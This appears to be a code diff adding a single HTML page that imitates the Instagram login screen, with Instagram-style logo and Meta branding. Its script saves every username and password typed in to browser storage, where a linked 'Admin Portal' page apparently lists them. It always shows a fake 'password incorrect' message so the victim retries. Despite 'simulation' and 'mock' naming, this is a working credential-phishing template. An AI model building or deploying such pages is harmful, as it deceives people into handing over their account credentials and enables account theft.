@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #121212; height: 100vh; display: flex; justify-content: center; align-items: center; }
+
+    /* LOGIN STYLES */
+    .ig-page {
+      display: flex;
+      min-height: 520px;
+      width: 900px;
+      max-width: 95vw;
+      background: #121212;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid #333;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    }
+    .ig-left {
+      flex: 1;
+      background: #1a1a1a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      gap: 24px;
+    }
+    .ig-logo { width: 72px; height: 72px; }
+    .ig-tagline {
+      font-size: 26px;
+      font-weight: 600;
+      color: #fff;
+      text-align: center;
+      line-height: 1.3;
+    }
+    .ig-tagline span {
+      background: linear-gradient(90deg, #fd1d1d, #e1306c, #c13584);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .ig-preview { display: flex; gap: 8px; margin-top: 8px; }
+    .ig-preview-card {
+      width: 80px;
+      height: 120px;
+      background: #2a2a2a;
+      border-radius: 8px;
+      overflow: hidden;
+      position: relative;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+    .ig-preview-card:nth-child(2) { height: 140px; margin-top: -10px; z-index: 2; }
+    .card-inner {
+      width: 100%; height: 100%;
+      background: linear-gradient(135deg, #2d2d2d 0%, #3a3a3a 100%);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .card-inner svg { opacity: 0.3; }
+
+    .ig-right {
+      flex: 1;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 48px 40px; gap: 16px;
+    }
+    .ig-right h2 { color: #e8e8e8; font-size: 18px; font-weight: 500; margin-bottom: 8px; align-self: flex-start; }
+    .ig-input {
+      width: 100%; background: #2a2a2a; border: 1px solid #3a3a3a;
+      border-radius: 10px; padding: 14px 16px; font-size: 14px;
+      color: #e8e8e8; outline: none; transition: border-color 0.2s;
+    }
+    .ig-input::placeholder { color: #6a6a6a; }
+    .ig-input:focus { border-color: #555; }
+    .ig-btn {
+      width: 100%; padding: 14px; background: #1877F2; color: #fff;
+      border: none; border-radius: 10px; font-size: 15px; font-weight: 600;
+      cursor: pointer; transition: background 0.2s; margin-top: 4px;
+    }
+    .ig-btn:hover { background: #1565D8; }
+    .ig-forgot { font-size: 13px; color: #a8a8a8; cursor: pointer; text-decoration: none; }
+    .ig-forgot:hover { color: #e8e8e8; }
+    .ig-divider {
+      display: flex; align-items: center; gap: 12px; width: 100%; margin: 4px 0;
+    }
+    .ig-divider hr { flex: 1; border: none; border-top: 0.5px solid #3a3a3a; }
+    .ig-divider span { font-size: 12px; color: #6a6a6a; text-transform: uppercase; letter-spacing: 1px; }
+    .ig-fb-btn {
+      width: 100%; padding: 13px; background: transparent; color: #e8e8e8;
+      border: 0.5px solid #3a3a3a; border-radius: 10px; font-size: 14px;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .ig-fb-btn:hover { background: #2a2a2a; }
+    .ig-create-btn {
+      width: 100%; padding: 13px; background: transparent; color: #6ab0ff;
+      border: 0.5px solid #3a6fa8; border-radius: 10px; font-size: 14px; cursor: pointer;
+    }
+    .ig-create-btn:hover { background: rgba(106,176,255,0.08); }
+    .ig-meta { font-size: 12px; color: #555; display: flex; align-items: center; gap: 6px; margin-top: 10px; }
+    
+    .error-msg {
+      color: #ff6b6b; font-size: 13px; display: none; width: 100%;
+      text-align: center; padding: 10px; background: rgba(255,107,107,0.1);
+      border-radius: 8px; border: 0.5px solid rgba(255,107,107,0.3);
+    }
+
+    /* Link to Admin */
+    .admin-link {
+      position: fixed; bottom: 10px; right: 10px;
+      color: #333; text-decoration: none; font-size: 11px;
+    }
+    .admin-link:hover { color: #555; }
+  </style>
+</head>
+<body>
+
+  <div class="ig-page">
+    <div class="ig-left">
+      <svg class="ig-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" style="stop-color:#F9CE34"/>
+            <stop offset="25%" style="stop-color:#EE2A7B"/>
+            <stop offset="75%" style="stop-color:#C13584"/>
+            <stop offset="100%" style="stop-color:#405DE6"/>
+          </linearGradient>
+        </defs>
+        <rect x="10" y="10" width="80" height="80" rx="22" fill="url(#igGrad)"/>
+        <rect x="25" y="25" width="50" height="50" rx="12" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="50" cy="50" r="14" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="68" cy="32" r="4" fill="white"/>
+      </svg>
+
+      <div class="ig-tagline">
+        See everyday moments from<br>your <span>close friends.</span>
+      </div>
+
+      <div class="ig-preview">
+        <div class="ig-preview-card">
+          <div class="card-inner">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+          </div>
+        </div>
+        <div class="ig-preview-card">
+          <div class="card-inner">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+          </div>
+        </div>
+        <div class="ig-preview-card">
+          <div class="card-inner">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2a10 10 0 100 20A10 10 0 0012 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="ig-right">
+      <h2>Log into Instagram</h2>
+      <input class="ig-input" id="username" type="text" placeholder="Mobile number, username or email" autocomplete="off"/>
+      <input class="ig-input" id="password" type="password" placeholder="Password"/>
+      <div class="error-msg" id="errMsg">Something went wrong. Please try again later.</div>
+      <button class="ig-btn" onclick="handleLogin()">Log in</button>
+      <a class="ig-forgot" href="#">Forgot password?</a>
+      <div class="ig-divider">
+        <hr/><span>or</span><hr/>
+      </div>
+      <button class="ig-fb-btn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Log in with Facebook
+      </button>
+      <button class="ig-create-btn">Create new account</button>
+      <div class="ig-meta">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="#555"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        Meta
+      </div>
+    </div>
+  </div>
+
+  <a href="admin.html" class="admin-link">Admin Portal</a>
+
+  <script>
+    /**
+     * MOCK BACKEND SERVICE
+     * This class must be present in both files to share data via LocalStorage
+     */
+    class MockBackend {
+      constructor() {
+        // IMPORTANT: Key must match exactly in admin.html
+        this.storageKey = 'ig_simulation_users_db';
+      }
+      saveLogin(username, password) {
+        const currentData = this.getAll();
+        const newRecord = {
+          id: Date.now(),
+          timestamp: new Date().toLocaleString(),
+          username: username,
+          password: password
+        };
+        currentData.push(newRecord);
+        localStorage.setItem(this.storageKey, JSON.stringify(currentData));
+        return true;
+      }
+      getAll() {
+        const data = localStorage.getItem(this.storageKey);
+        return data ? JSON.parse(data) : [];
+      }
+      deleteRecord(id) {
+        let data = this.getAll();
+        data = data.filter(record => record.id !== id);
+        localStorage.setItem(this.storageKey, JSON.stringify(data));
+      }
+      clearAll() {
+        localStorage.removeItem(this.storageKey);
+      }
+    }
+
+    const db = new MockBackend();
+
+    function handleLogin() {
+      const uInput = document.getElementById('username');
+      const pInput = document.getElementById('password');
+      const errBox = document.getElementById('errMsg');
+      const btn = document.querySelector('.ig-btn');
+
+      const u = uInput.value.trim();
+      const p = pInput.value.trim();
+
+      if (!u || !p) {
+        errBox.textContent = 'Please enter your username and password.';
+        errBox.style.display = 'block';
+        return;
+      }
+
+      // Loading state
+      errBox.style.display = 'none';
+      btn.textContent = 'Logging in...';
+      btn.disabled = true;
+
+      // Simulate network delay & save to backend
+      setTimeout(() => {
+        db.saveLogin(u, p);
+
+        errBox.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+        errBox.style.display = 'block';
+        
+        btn.textContent = 'Log in';
+        btn.disabled = false;
+        
+        // Clear password for "security"
+        pInput.value = '';
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
